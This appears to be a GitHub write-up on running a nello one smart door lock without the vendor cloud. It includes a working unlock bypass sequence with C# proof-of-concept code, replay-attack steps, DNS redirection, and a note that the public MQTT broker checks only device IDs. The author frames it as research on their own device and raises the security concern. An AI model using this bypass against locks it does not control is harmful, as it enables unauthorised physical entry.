# NELLO ONE - Remove cloud constraint (incl. security bypass sequence)
## License

 This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.  
 This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  
 See the GNU General Public License for more details.  
 For full license text, see [http://www.gnu.org/licenses](http://www.gnu.org/licenses).

## Table of Contents

-   [1. The Story](#1-the-story)
-   [2. Preamble](#2-preamble)
-   [3. Understanding](#3-understanding)
    -   [3.1. Understanding 1: nello public cloud MQTT broker access](#31-understanding-1-nello-one-public-cloud-mqtt-broker-access)
    -   [3.2. Understanding 2: communication interaction between nello and cloud backend](#32-understanding-2-communication-interaction-between-nello-and-the-cloud-backend)
    -   [3.3. Understanding 3: protocol sequence after reset](#33-understanding-3-protocol-sequence-after-reset)
-   [4. The interesting parts](#4-the-interesting-parts)
    -   [4.1. Re-route nello to local MQTT broker](#41-re-route-nello-to-local-mqtt-broker)
    -   [4.2. Control nello (the analyis)](#42-control-nello-the-analysis)
    -   [4.3. Control nello (the attack)](#43-control-nello-the-attack)
    -   [4.4. Security concerns (my opionion)](#44-security-concerns-my-opinion)
    -   [4.5. Further remark](#45-further-remark)
-   [5. Update 1: Get ring bell notifications](#5-update-1-get-ring-bell-notifications)
    -   [5.1. The replay attack](#51-the-replay-attack)
-   [6. Update 2: Full non-cloud based backend solution](#6-update-2-full-non-cloud-based-backend-solution)

## 1. The Story

Usually nello devices (formerly distributed through [nello.io](https://nello.io), now fully acquired by [sclak.com](https://sclak.com))  communicate directly with a cloud based MQTT broker - hosted by the vendor, that can control the devices.  
With help of the vendors app or their official APIs - not available at the moment - an authenticated user can e.g. remotely open his/her locks.  
This article describes the process, on how to control a nello device, without having the need to use the vendors cloud system.
To achieve that goal, the PoC will make use of a security bypass sequence, to avoid needing any insight knowhow about the encryption and decryption cipher keys.  

## 2. Preamble
It is **not** neccessary to modify the nello firmware.  
The entire solution was only tested with a nello device, connected to a bticino 100 Audio system (2 wired bus).  

**See [Update 2](#6-update-2-full-non-cloud-based-backend-solution) for the full cloud-less backend solution.**  

## 3. Understanding  

### 3.1. Understanding 1: nello one public cloud MQTT broker access  

![](https://github.com/LFE89/nello_one_without_cloud/blob/master/images/CLOUD_01.png)

As soon as a nello device connects back to a wifi network, it tries to connect to the MQTT broker "live-mqtt.nello.io:1883".

It connects to the MQTT broker by using its internal device id (used as a "mqtt client id") only.  
No username / password nor certificate authentication is in place or needed.

Having said that, everyone with a valid device id (wireshark might help) can connect to the public cloud nello MQTT broker.  
Once connected, it is possible to get information about other active nello devices - such as device identifier, encrypted messages, etc.

### 3.2. Understanding 2: communication interaction between nello and the cloud backend  

Nello will automatically subscribe to the following topics:  

```
/nello_one/{second deviceid}/test/
/nello_one/{second deviceid}/BE_ACK/
/nello_one/{second deviceid}/tw/
/nello_one/{second deviceid}/geo/
/nello_one/{second deviceid}/door/
/nello_one/{second deviceid}/BEn/
```

The nello backend uses two different nello device identifiers.  

The first one is being used to connect to the MQTT broker (as a client id):  
**First id**: format Pt######## (10 digits)

The second one is being used as a MQTT topic identifier for a specific device:   
**Second id**: format X##### (6 digits)

After the subscription process is done, nello and the cloud system exchange different kind of base64 encoded messages with QoS 1.  
Assumption: nello was already connected to the backend. (see [3.3. Uncertainties: wifi ssid transmission](#33-uncertainties-wifi-ssid-transmission))  

**1. Topic: map**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/map/JA...oMf0=\n```  
This message (length: 32 byte - exluding ''\n') is always the same for a single device.

**2. Topic: test**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/test/Iu....O...\n```  
This message varies in its content. Only the length (48 byte, exluding ''\n') seems to be always the same.

**3. Topic: n_online**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/n_online/81...=\n```  
This message varies in its content. Only the length (32 byte, exluding ''\n') seems to be always the same.  

**4. Topic: BE_ACK**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/BE_ACK/Qg...=\n```  
This message varies in its content. Only the length (32 byte, exluding ''\n') seems to be always the same.  
Afterwards the connection is fully established, nello blinks like it is used to be, etc etc etc..  

**Door unlock command sequence**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/door/ZJ...=\n```  
This message varies in its content. Only the length (32 byte, exluding ''\n') seems to be always the same.  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/n_ACK/ZE...=\n```  
This message varies in its content. Only the length (32 byte, exluding ''\n') seems to be always the same.  

### 3.3. Understanding 3: protocol sequence after reset  
During the very first backend connection establishment process (after a reset has been done), the protocol sequence is slightly different:  

**1. Topic: map**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/map/JA...oMf0=\n```  

**2. Topic: test**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/test/Iu....O...\n```  

**3. Topic: BEn**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/BEn/81...=\n```  

**4. Topic: n_to_BE**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/n_to_BE/Lo...oM1=\n```  

**5. Topic: BEn**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/BEn/75...1=\n```  

**6. Topic: n_to_BE**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/n_to_BE/aD...oMg1=\n```  

**7. Topic: BEn**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/BEn/94...dK=\n```  

**8. Topic: BEn**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/BEn/MP...=\n```  

**9. Topic: N_ACK**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/N_ACK/Oj...o1=\n```

**10. Topic: n_to_BE**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/n_to_BE/kL..daA=\n```

**11. Topic: BEn**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/BEn/fA...=\n```  

**12. Topic: N_ACK**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/N_ACK/bE...dA1=\n```

**13. Topic: n_online**  
Nello device -> Nello Backend (MQTT Broker)  
```/nello_one/{second deviceid}/n_online/fe...=\n```  

**14. Topic: BE_ACK**  
Nello Backend (MQTT Broker) -> Nello device  
```/nello_one/{second deviceid}/BE_ACK/Qa...=\n```  

During this phase, nello one will probable transfer the wifi ssid and the "location id" to the backend.  
Afterwards nello one is in its correct system state and is waiting for commands or internal bell notification indicators.  

## 4. The interesting parts  
### 4.1. Re-route nello to local MQTT broker  

The communication flow between the backend and the device is known.  

But, it's not possible to do a lot of things right now.  
The cloud MQTT broker does not permit, to send messages directly to the backend related topics in the name of the backend - if you're only connected as a nello device.  
Therefore, it is only possible to read the encoded and **encrypted messages**.

This is an important information. All the encoded messages, seem to be encrypted with AES 256 using CBC mode and PKCS7 padding (my guess). That is pretty cool.

Let's go on.  
Since a modification of the firmware isn't wanted, it is still neccessary to redirect the traffic from a nello device from "live-mqtt.nello.io" to a local MQTT broker.  
Don't do anything DNS spoofing (local of course..) related, because there are other elegant solutions to this problem:  

Setup a dedicated local DNS server on a raspberry pi (using Bind9 or just dnsmasq (simple)).  
Create either a new HOST A record or create a forwarding entry to "redirect" all local DNS requests of "live-mqtt.nello.io" to a local MQTT broker (192.168.8.3).  

![](https://github.com/LFE89/nello_one_without_cloud/blob/master/images/PING_01.png)

My chosen test environment:  

![](https://github.com/LFE89/nello_one_without_cloud/blob/master/images/NONCLOUD_01.png)

After nello restarts (disconnect power, connect power again -> to force nello to resolve the new MQTT broker ip address by using the new DNS server, which is also configured in the existing DHCP server), the nello device will connect to the local MQTT broker (e.g. mosquitto) and starts to send the connection initiating sequence to the "map" topic:

![](https://github.com/LFE89/nello_one_without_cloud/blob/master/images/LOCAL_BROKER_01.png)

First achievement!  
Nello is connected to the local MQTT broker.  

### 4.2. control nello (the analysis)  

**My thoughts and approaches to go on**

1. Try a replay attack
2. Try a crypto analysis
3. Try to find buffer overflows or missing payload validiation to bypass the security layer in the firmware

The **replay attack** didn't work.  
Nello validates (almost ;-)) each payload, and probably checks for a matching timestamp within the encrypted message.  

My **crypto analysis** didn't work. 
Since nello is probably using a AES256 encryption, I had no luck to find a proper key nor to find a proper IV.  
I've to admit, that I first thought something like: the first message sent from nello to the "map" topic might help, because it is always the same, and might contain the key. Maybe it is true, but it is probably encrypted as well and did not help me.  

The **security bypass approach** worked.  
I've found a message sequence (including payload), which is able to bypass the "security layer" and to unlock a door, without having the need to know anything about the encrypted messages.  

Bingo. 

### 4.3. control nello (the attack)  

1.  Intercept one message sent from the backend to the "test" topic of the specific nello device  
2.  Send a special message sequence to the local mqtt broker  
    
**1. The interception**  

As stated, the public cloud MQTT broker of nello is only protected by checking for a valid device identifier (#1).    
By connecting to the broker in the name of a nello device, it is possible to copy any messages which are needed (**don't do so**).  
The better solution is to use wireshark and sniff all the traffic. It only affects your network and you can decide what you do there.
Simply use a network tap between nello and the outgoing modem (nello -> switch (mirror traffic port x to y) -> PC (listen on eth0 passive connected to port y, only for incoming traffic)).

The nello device needs to be connected to the real public live-mqtt.nello.io MQTTT broker, during this phase.  
Disable the new DNS HOST A entry, re-connect nello.  

Nello will immediately start over with the starting sequences from above, when it is re-connected.  
At some point, the nello backend will send an encrpyted message to the "test" topic.  
Capture it!  
Even the fact, that the "test topic" message will change over time - as mentioned above - doesn't matter.  
Only one single valid test message is needed.  
(I even used a very old test message, which I've captured a year ago)  

Enable the new DNS HOST A entry, re-connect nello to the local MQTT broker.  

**2. The security bypass sequence**

**Send mqtt message #1**  
/nello_one/{your deviceid #2}/test/{intercepted test message}\n

Wait ~500ms

**Send mqtt message #2**  
/nello_one/{your deviceid #2}/door/**""\n** (can be even another valid door message)

The combination of both messages, in the right order with the right delay-time in between, will force nello to bypass any security verifications and leads to the wished result: **the door lock gets unlocked**. 

It works, because nello frequently sends a message to the "map" topic, indicating it is waiting for a connection and is ready to start the connection establishment process (our chance!).  
To send the "unlock" security bypass sequence only once, will not work everytime.  
Because nello first responds, after it sent the "map" message.  
To overcome this problem, it would be the best solution to wait until nello sent a "map" message (<2 s).
For simplification and other test reasons, I just continue sending the sequence multiple times, until nello responses with an "n_ack" (or until a cancellation limit is reached, for other reasons..).

```
 // We try a max send sequence of 15 times
 // In avg. nello opened my lock on the third try
 while (!isExpectedResponseReceived && counter < 15)
 {
     // Send magic payload to test topic
     
     await mqttService.SendMessageAsync(string.Format("/nello_one/{0}/test/", nelloDeviceId), testTopicMagicPayload);
     
     // Delay - in my case - necessary
     // Give nello some time to prepare for the next message
     // Maybe you need to increase your delay value (depends also on your network)
     
     await Task.Delay(500);
     
     // Send magic payload to door topic
     
     await mqttService.SendMessageAsync(string.Format("/nello_one/{0}/door/", nelloDeviceId), doorTopicMagicPayload);
     
     Console.WriteLine("Commands sent");
     
     // Delay included, to have some time to react to nello responses (MqttService_AckOnlineSequenceReceived)
     
     await Task.Delay(1000);
     counter += 1;
 }
```

It opened my lock in 100% of my tests.  
The full PoC code is added.  

![](https://github.com/LFE89/nello_one_without_cloud/blob/master/images/PROOF_01.png)

Voilà.  
First try, "n_ACK" from nello has been received, and the door is unlocked.

### 4.4. Security concerns (my opinion)  
The security bypass sequence proof of concept also shows, that people with write access to the public cloud MQTT Broker "test" and "door" topics, easily could force a nello device to unlock a door, without further user authentication - except the initial MQTT Broker authentication. In my opinion, it is a low-med security concern, because probably a few sclak.com and nello.io employees or partner do have access to the specific MQTT broker with write access. So, that should be changed in the firmware, to decrease the probability of an unintentional misuse of any locks.  


### 4.5. Further remark  

Since, it is just a "hack", the device itself never fully comes to its expected connection state, therefore no "bell ring" signals will be send to a local MQTT broker by nello - yet ;-).  

  
Cheers  
(Lars Feicho)


## 5. Update 1: Get ring bell notifications    
It is possibe to get MQTT messages from nello, as soon as someone rings the bell, by doing a replay attack for this purpose.  
Tradeoff: You'll get notifications, but the door unlock bypass sequence doesn't work any longer, because nello is in its correct system state.  

### 5.1. The replay attack  
Capture at least one message from each of the following topics:   

```
/nello_one/{second deviceid}/test/
/nello_one/{second deviceid}/BE_ACK/
```

Wait until nello tries to initiate the connection process by sending a message to the "map" topic.  

Send message to the broker:  
```
/nello_one/{second deviceid}/test/{captured_test_message}
```
Wait for nello's response on:  
```
/nello_one/{second deviceid}/n_online/{some_message}
```
Send message to the broker:  
```
/nello_one/{second deviceid}/BE_ACK/{some_message}
```  

In my test setup, nello is now connected properly.  
Try a test ring.  
Nello should reply with:  

![](https://github.com/LFE89/nello_one_without_cloud/blob/master/images/NELLO_RING_1.png)  

Voilà.  

Please note: nello sends every five minutes a message to the "n_online" topic, waiting to be acknowlegded with a message to the "BE_ACK" topic. If there will be no response from the backend, nello will start over with the connection process and does not listen for ring bell signals any longer.

## 6. Update 2: Full non-cloud based backend solution  

#### Summary of the three possible solutions:

| Solution | Command support | Notification support | Time |
| --- | --- | --- | --- |
| 1. Only unlock command | Y | N | < 2 seconds |
| 2. Only bell ring notification | N | Y | < 2 seconds |
| 3. Full cloud-less nello backend | Y | Y | Notification: <br/><2 sec.<br/>Command: <br/>< 13 sec. |  

#### How does the full cloud-less backend will work?

Simply by combining solution 1 and 2.  
It'll use the replay attack to force nello to connect properly to the local backend.  

**Info:**  
The more "BE_ACK" messages of one entire connection period you have recorded, the less reconnections are necessary.  
Unfortunately the best amount I recorded, were three "n_online" -> "BE_ACK" messages **in a row**. Then my nello device did automatically a reconnect and started over again.  

Having said that, my nello device will reconnect ~90 times in 24h. That is true for both solutions, the public cloud backend and the cloud-less backend (because I only was able to record three "BE_ACK" messages).  
I think that's a strange behavior. If someone can confirm this behavior with her/his nello as well, that would be great and could be a hint of a misconfigured public cloud backend (e.g. tcp connection / backend ignores keep alive packets).  
Otherwise, it could also be possible that some of my network devices will terminate the connection as well... Don't know yet.  

**The most important point to keep in mind about the full cloud-less backend solution:**  
Since it is only possible to open the door during nello's connection etstablishment startup phase - remember the security bypass approach - we've to terminate its MQTT session first to force nello to reconnect. That will lead to a longer delay.  

Not the best solution, but'll work.  
![](https://github.com/LFE89/nello_one_without_cloud/blob/master/images/BACKEND_SOL_1.JPG)  
